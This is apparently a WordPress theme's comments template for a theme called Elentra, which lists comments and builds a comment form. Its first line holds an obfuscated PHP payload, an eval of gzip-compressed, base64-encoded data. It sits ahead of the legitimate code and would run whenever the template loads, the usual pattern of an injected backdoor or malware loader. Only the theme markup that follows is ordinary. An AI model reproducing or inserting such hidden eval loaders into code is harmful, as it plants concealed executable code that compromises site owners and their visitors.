<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* @package Elentra
*/
if( post_password_required() ) { return; } if( have_comments() ): ?>

<div class="co-comment-wrapper fix">
    <h4 class="comment-title"><?php comments_number ( __('No comments','elentra'), __( 'comment 1','elentra'), __('% Comments','elentra') ); ?></h4>

    <?php the_comments_navigation(); ?>
    <!-- Comment List -->
    <ul class="co-comment-list">

        <?php 
            $args = array(
                'style'       => 'ol',
                'short_ping'  => true,
                'avatar_size' => 64,
                'callback' => 'elentra_comments_data'
            );
            wp_list_comments( $args );
        ?>

    </ul>

    <?php the_comments_navigation(); ?>

    <?php if( !comments_open() && get_comments_number() ): ?>
        <p class="no-comments"><?php esc_html_e( 'Comments are closed.', 'elentra' ); ?></p>
    <?php endif; ?>

    <?php endif; ?>

    <?php

        $fields = array(
        
            'author' => '<div class="col-sm-4 col-xs-12 mb-25"><input id="author" name="author" type="text" placeholder="' . esc_attr__( 'Name', 'elentra' ) . '" value="' . esc_attr( $commenter['comment_author'] ) . '" required="required"/></div>',
            
            'email' => '<div class="col-sm-4 col-xs-12 mb-25"><input id="email" name="email" type="email" placeholder="' . esc_attr__( 'Email', 'elentra' ) . '" value="' . esc_attr( $commenter['comment_author_email'] ) . '" required="required" /></div>',

            'url' => '<div class="col-sm-4 col-xs-12 mb-25"><input id="url" name="url" type="text" placeholder="' . esc_attr__( 'Website', 'elentra' ) . '" value="' . esc_attr( $commenter['comment_author_url'] ) . '" /></div>'
        );
        
        $comments_args = array(

            'submit_button' => '<div class="col-xs-12">'.'<input  name="%1$s" type="submit" id="%2$s" value="Submit" />'.'</div>',
            'title_reply'  =>  '<h4 class="comment-title">' . esc_html__( 'Leave a Comment', 'elentra' ) . '</h4>',
            'comment_notes_after' => '',
            'comment_field' => '
                <div class="col-xs-12">
                    <textarea id="comment" name="comment" placeholder="'. esc_attr__( 'Message', 'elentra' ) .'" required></textarea>
                </div>',
            'fields' => apply_filters( 'comment_form_default_fields', $fields )
        );
    ?>

    <div class="co-comment-form row">
        <?php comment_form($comments_args); ?>
    </div>

</div>